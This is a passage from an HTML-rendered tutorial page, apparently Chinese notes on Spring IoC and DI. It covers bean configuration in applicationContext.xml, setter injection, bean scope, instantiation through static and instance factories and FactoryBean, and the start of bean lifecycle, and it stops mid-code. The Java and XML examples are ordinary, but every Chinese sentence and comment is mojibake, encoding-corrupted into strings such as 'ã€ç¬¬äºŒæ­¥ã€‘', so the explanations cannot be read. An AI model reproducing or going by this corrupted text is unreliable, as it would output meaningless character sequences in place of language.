class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>ã€ç¬¬äºŒæ­¥ã€‘å®šä¹‰Springç®¡ç†çš„ç±»ï¼ˆæ¥å£ï¼‰</p><blockquote><p>åŸæœ¬å·²ç»å®šä¹‰å¥½äº†</p></blockquote></li><li><p>ã€ç¬¬ä¸‰æ­¥ã€‘åˆ›å»ºSpringé…ç½®æ–‡ä»¶ï¼Œé…ç½®å¯¹åº”ç±»ä½œä¸ºSpringç®¡ç†çš„beanå¯¹è±¡</p><blockquote><p>å®šä¹‰applicationContext.xmlé…ç½®æ–‡ä»¶å¹¶é…ç½®BookServiceImpl</p></blockquote><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--    1.å¯¼å…¥Springçš„åæ ‡Springâ€”contextï¼Œå¯¹åº”ç‰ˆæœ¬æ˜¯5.2.10 RELEASE--&gt;</span><span class="token comment">&lt;!--    2.é…ç½®bean,idç›¸å½“äºåå­—æ–¹ä¾¿å–ä¸œè¥¿classå±æ€§ï¼šè¡¨ç¤ºç»™beanå®šä¹‰ç±»å‹--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookdao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>com.yang.dao.impl.Bookimpl<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>servicedao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.service.impl.serviceimpl<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ã€ç¬¬å››æ­¥ã€‘åˆå§‹åŒ–IOCå®¹å™¨ï¼ˆSpringæ ¸å¿ƒå®¹å™¨/Springå®¹å™¨ï¼‰ï¼Œé€šè¿‡å®¹å™¨è·å–beanå¯¹è±¡</p><p>åœ¨app2è¿›è¡Œå®ç°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>servicedao</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> app2 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//è·å–IOCå®¹å™¨</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è·å–bookimpçš„bean</span><span class="token comment">//        Bookdao Bookdao = (Bookdao) ctx.getBean("bookdao");</span><span class="token comment">//        Bookdao.save();</span>        <span class="token comment">//è·å–serviceimplçš„bean</span>        servicedao servicedao <span class="token operator">=</span> <span class="token punctuation">(</span>servicedao<span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"servicedao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        servicedao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·å¯ä»¥å¾—åˆ°ä»¥ä¸Šçš„åŸæœ¬å®ç°çš„ç»“æœã€‚</p></li></ul><h4 id="DIå…¥é—¨æ¡ˆä¾‹ï¼š"><a href="#DIå…¥é—¨æ¡ˆä¾‹ï¼š" class="headerlink" title="DIå…¥é—¨æ¡ˆä¾‹ï¼š"></a>DIå…¥é—¨æ¡ˆä¾‹ï¼š</h4><blockquote><ol><li>åŸºäºIOCç®¡ç†bean</li><li>Serviceä¸­ä½¿ç”¨newå½¢å¼åˆ›å»ºçš„Daoå¯¹è±¡æ˜¯å¦ä¿ç•™ï¼Ÿ(å¦)</li><li>Serviceä¸­éœ€è¦çš„Daoå¯¹è±¡å¦‚ä½•è¿›å…¥åˆ°Serviceä¸­ï¼Ÿ(æä¾›æ–¹æ³•)</li><li>Serviceä¸Daoé—´çš„å…³ç³»å¦‚ä½•æè¿°ï¼Ÿ(é…ç½®)</li></ol></blockquote><p><strong>å®ç°æ­¥éª¤ï¼š</strong></p><ul><li>ã€ç¬¬ä¸€æ­¥ã€‘åˆ é™¤ä½¿ç”¨newçš„å½¢å¼åˆ›å»ºå¯¹è±¡çš„ä»£ç </li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">Bookdao</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>yang<span class="token punctuation">.</span>service<span class="token punctuation">.</span>servicedao</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> serviceimpl <span class="token keyword">implements</span> servicedao <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Bookdao</span> bookdao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookdao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ã€ç¬¬äºŒæ­¥ã€‘æä¾›ä¾èµ–å¯¹è±¡å¯¹åº”çš„setteræ–¹æ³•</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// æä¾›å¯¹åº”çš„setteræ–¹æ³•</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBookdao</span><span class="token punctuation">(</span><span class="token class-name">Bookdao</span> bookdao<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bookdao <span class="token operator">=</span> bookdao<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>ã€ç¬¬ä¸‰æ­¥ã€‘é…ç½®serviceä¸daoä¹‹é—´çš„å…³ç³»</p><blockquote><p>åœ¨application.xmlä¸­é…ç½®</p></blockquote></li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>util</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/util<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util https://www.springframework.org/schema/util/spring-util.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--    1.å¯¼å…¥Springçš„åæ ‡Springâ€”contextï¼Œå¯¹åº”ç‰ˆæœ¬æ˜¯5.2.10 RELEASE--&gt;</span><span class="token comment">&lt;!--    2.é…ç½®bean,idç›¸å½“äºåå­—æ–¹ä¾¿å–ä¸œè¥¿--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookdao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>com.yang.dao.impl.Bookimpl<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>servicedao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yang.service.impl.serviceimpl<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--  é…ç½®serverå’Œdaoçš„å…³ç³»--&gt;</span>        <span class="token comment">&lt;!--é…ç½®serverä¸daoçš„å…³ç³»propertyæ ‡ç­¾ï¼šè¡¨ç¤ºé…ç½®å½“å‰beançš„å±æ€§        nameå±æ€§ï¼šè¡¨ç¤ºé…ç½®å“ªä¸€ä¸ªå…·ä½“çš„å±æ€§        refå±æ€§ï¼šè¡¨ç¤ºå‚ç…§å“ªä¸€ä¸ªbean--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>bookdao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>bookdao<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œapp2ï¼Œç»“æœä¸€æ ·ã€‚</p><p><strong>ä¸¤ä¸ªbookdaoæŒ‡å‘ä¸ä¸€æ ·</strong>ã€‚</p><img src="image-20220330110831415.png" style="zoom:50%;"><h4 id="Beançš„åŸºç¡€é…ç½®ï¼š"><a href="#Beançš„åŸºç¡€é…ç½®ï¼š" class="headerlink" title="Beançš„åŸºç¡€é…ç½®ï¼š"></a>Beançš„åŸºç¡€é…ç½®ï¼š</h4><p><strong>é…ç½®è¯´æ˜ï¼š</strong></p><img src="image-20210729183500978.png" style="zoom: 50%;"><p><strong>Beanåˆ«åé…ç½®ï¼š</strong></p><img src="image-20220330115738655.png" style="zoom: 80%;"><blockquote><p>è·å–beanï¼Œæ— è®ºæ˜¯nameè¿˜æ˜¯idï¼Œå¦‚æœæ— æ³•è·å–åˆ°ï¼Œå°†æŠ›å‡ºå¼‚å¸¸<code>NoSuchBeanDefinitionException</code></p></blockquote><h4 id="Beanä½œç”¨èŒƒå›´é…ç½®ï¼š"><a href="#Beanä½œç”¨èŒƒå›´é…ç½®ï¼š" class="headerlink" title="Beanä½œç”¨èŒƒå›´é…ç½®ï¼š"></a>Beanä½œç”¨èŒƒå›´é…ç½®ï¼š</h4><p><strong>Springé»˜è®¤ç”Ÿæˆå•ä¾‹å¯¹è±¡ï¼Œå¯å¤ç”¨</strong></p><img src="image-20210729183628138.png" alt="image-20210729183628138" style="zoom:50%;"><blockquote><p>scopeçš„å–å€¼ä¸ä»…ä»…åªæœ‰singletonå’Œprototypeï¼Œè¿˜æœ‰requestã€sessionã€applicationã€ websocket ï¼Œè¡¨ç¤ºåˆ›å»ºå‡ºçš„å¯¹è±¡æ”¾ç½®åœ¨webå®¹å™¨(tomcat)å¯¹åº”çš„ä½ç½®ã€‚æ¯”å¦‚ï¼šrequestè¡¨ç¤ºä¿å­˜åˆ°requeståŸŸä¸­ã€‚</p></blockquote><h4 id="Beançš„å®ä¾‹åŒ–ï¼š"><a href="#Beançš„å®ä¾‹åŒ–ï¼š" class="headerlink" title="Beançš„å®ä¾‹åŒ–ï¼š"></a>Beançš„å®ä¾‹åŒ–ï¼š</h4><blockquote><p>beanæœ¬è´¨ä¸Šå°±æ˜¯å¯¹è±¡ï¼Œåˆ›å»ºbeanä½¿ç”¨æ„é€ æ–¹æ³•å®Œæˆ</p></blockquote><p><strong>æ„é€ æ–¹æ³•æ–¹å¼</strong>ï¼š</p><p>å’ŒIOCå…¥é—¨å®ä¾‹ä¸€æ ·ã€‚</p><p><strong>Springåˆ›å»ºbeanè°ƒç”¨çš„æ˜¯æ— å‚çš„æ„é€ æ–¹æ³•</strong></p><p><strong>é™æ€å·¥å‚æ–¹å¼ï¼š</strong></p><ul><li>OrderDaoæ¥å£å’ŒOrderDaoImplå®ç°ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">OrderDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">OrderDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"order dao save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>OrderDaoFatoryå·¥å‚ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//é™æ€å·¥å‚åˆ›å»ºå¯¹è±¡</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderDaoFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">OrderDao</span> <span class="token function">getOrderDao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"factory setup...."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">OrderDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>applicationContext.xmlé…ç½®</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--æ–¹å¼äºŒï¼šä½¿ç”¨é™æ€å·¥å‚å®ä¾‹åŒ–bean--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>orderDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.factory.OrderDaoFactory<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getOrderDao<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>AppForInstanceOrderæµ‹è¯•ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppForInstanceOrder</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OrderDao</span> orderDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">OrderDao</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"orderDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        orderDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å®ä¾‹å·¥å‚æ–¹å¼ï¼š</strong></p><ul><li>UserDaoæ¥å£å’ŒUserDaoImplå®ç°ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"user dao save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>UserDaoFactoryå·¥å‚ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//å®ä¾‹å·¥å‚åˆ›å»ºå¯¹è±¡</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">UserDao</span> <span class="token function">getUserDao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>applicationContext.xmlé…ç½®</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--æ–¹å¼ä¸‰ï¼šä½¿ç”¨å®ä¾‹å·¥å‚å®ä¾‹åŒ–bean--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userFactory<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.factory.UserDaoFactory<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getUserDao<span class="token punctuation">"</span></span> <span class="token attr-name">factory-bean</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userFactory<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>AppForInstanceUseræµ‹è¯•ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppForInstanceUser</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//        //åˆ›å»ºå®ä¾‹å·¥å‚å¯¹è±¡</span>        <span class="token comment">//        UserDaoFactory userDaoFactory = new UserDaoFactory();</span>        <span class="token comment">//        //é€šè¿‡å®ä¾‹å·¥å‚å¯¹è±¡åˆ›å»ºå¯¹è±¡</span>        <span class="token comment">//        UserDao userDao = userDaoFactory.getUserDao();</span>        <span class="token comment">//        userDao.save();</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UserDao</span> userDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UserDao</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"userDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        userDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="FactoryBean-lt-T-gt-æ–¹å¼ï¼š"><a href="#FactoryBean-lt-T-gt-æ–¹å¼ï¼š" class="headerlink" title="FactoryBean<T>æ–¹å¼ï¼š"></a>FactoryBean&lt;T&gt;æ–¹å¼ï¼š</h4><ul><li>å®šä¹‰UserDaoFactoryBeanå®ç°FactoryBean&lt;UserDao&gt;</li></ul><blockquote><p>UserDaoFactoryBeanä¸­å®ä¾‹åŒ–ä»€ä¹ˆç±»å‹çš„å¯¹è±¡æ³›å‹å°±æ˜¯è¯¥ç±»å‹ã€‚</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//FactoryBeanåˆ›å»ºå¯¹è±¡</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoFactoryBean</span> <span class="token keyword">implements</span> <span class="token class-name">FactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">UserDao</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token comment">//ä»£æ›¿åŸå§‹å®ä¾‹å·¥å‚ä¸­åˆ›å»ºå¯¹è±¡çš„æ–¹æ³•</span>    <span class="token keyword">public</span> <span class="token class-name">UserDao</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">UserDaoImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> <span class="token function">getObjectType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token class-name">UserDao</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>applicationContext.xmlé…ç½®</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>æ–¹å¼å››ï¼šä½¿ç”¨<span class="token class-name">FactoryBean</span>å®ä¾‹åŒ–bean<span class="token operator">--</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>bean id<span class="token operator">=</span><span class="token string">"userDao"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.itheima.factory.UserDaoFactoryBean"</span><span class="token operator">/</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Beançš„ç”Ÿå‘½å‘¨æœŸï¼š"><a href="#Beançš„ç”Ÿå‘½å‘¨æœŸï¼š" class="headerlink" title="Beançš„ç”Ÿå‘½å‘¨æœŸï¼š"></a>Beançš„ç”Ÿå‘½å‘¨æœŸï¼š</h4><blockquote><ul><li>ç”Ÿå‘½å‘¨æœŸï¼šä»åˆ›å»ºåˆ°æ¶ˆäº¡çš„å®Œæ•´è¿‡ç¨‹</li><li>beanç”Ÿå‘½å‘¨æœŸï¼šbeanä»åˆ›å»ºåˆ°é”€æ¯çš„æ•´ä½“è¿‡ç¨‹</li><li>beanç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼šåœ¨beanåˆ›å»ºååˆ°é”€æ¯å‰åšä¸€äº›äº‹æƒ…</li></ul></blockquote><p><strong>ä»£ç æ¼”ç¤ºï¼š</strong></p><ul><li>æä¾›ç”Ÿå‘½å‘¨æœŸæ§åˆ¶æ–¹æ³•</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookDao</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book dao save ..."</span><span class="token punctuation">)</span><span 